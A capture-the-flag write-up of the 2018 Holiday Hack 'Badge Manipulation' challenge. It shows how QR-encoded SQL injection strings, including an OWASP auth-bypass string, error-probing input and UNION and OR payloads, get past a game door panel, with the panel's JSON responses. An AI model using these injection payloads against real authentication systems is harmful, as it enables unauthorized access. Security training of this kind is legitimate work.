Question 6: Badge Manipulation
==============================

| Bypass the authentication mechanism associated with the room near Pepper Minstix. `A sample employee badge is available <https://www.holidayhackchallenge.com/2018/challenges/alabaster_badge.jpg>`_ . What is the access control number revealed by the `door authentication panel <https://scanomatic.kringlecastle.com/index.html>`_? For hints on achieving this objective, please visit Pepper Minstix and help her with the :doc:`Yule Log Analysis </terminals/YuleLogAnalysis>` Cranberry Pi terminal challenge.

Answer: *19880715*

Solution
^^^^^^^^

To solve this question we relied on the online `QR Code Generator <https://www.the-qrcode-generator.com/>`_ to generate the QR codes needed for the `Scanomatic door authentication panel <https://scanomatic.kringlecastle.com/index.html>`_. We also utilised ``Google Chrome -> Developer Tools -> Network -> Response`` to obtain the response from the door authentication panel.

Using the hints associated with this question, we assumed that the aim of this challange was to utilise a *SQLi injection* attack. We initially created a QR code representing the SQL injection with the the Auth Bypass code recommended by OWASP: ``or 1-- -' or 1 or '1"or 1 or"`` The QR code looked like:

.. image:: /images/qr1.png

This generated the following response::

 {"data":"Authorized User Account Has Been Disabled!","request":false}

This indicated that we could either perform a SQL injection or simply meant that our input was safely handled by the door authentication panel.

We then tried using a simple string with the hope that it would return some type of error. The string we used was ``';test``. This generated the following response from the door authentication panel::

 {"data":"EXCEPTION AT (LINE 96 \"user_info = query(\"SELECT first_name,last_name,enabled FROM employees WHERE authorized = 1 AND uid = '{}' LIMIT 1\".format(uid))\"): (1064, u\"You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'test' LIMIT 1' at line 1\")","request":false}

This was extremely helpful output because it showed the SQL query used by the panel including where our input was injected.

We then tried to inject a valid SQL statement using ``' #`` and obtained the following output::

 {"data":"No Authorized User Account Found!","request":false}


Based on this information, we decided to generate a query that included a condition where the **enabled** field was evaluated to true. We tried ``' UNION SELECT first_name,last_name,enabled FROM employees WHERE enabled = 1 #`` and were successful. The QR code for this successful entry looked like:

.. image:: /images/qr2.png

The response from the panel was::

 {"data":"User Access Granted - Control number 19880715","request":true,"success":{"hash":"ff60055a84873cd7d75ce86cfaebd971ab90c86ff72d976ede0f5f04795e99eb","resourceId":"false"}}

Other succesful injections
^^^^^^^^^^^^^^^^^^^^^^^^^^

After a bit of experimentation we found some alternative QR codes that consisted of the following statements::

 ' UNION SELECT first_name,last_name,enabled FROM employees WHERE enabled = '1' LIMIT 1; -- {'

and:

::

 ' OR enabled = 1 #
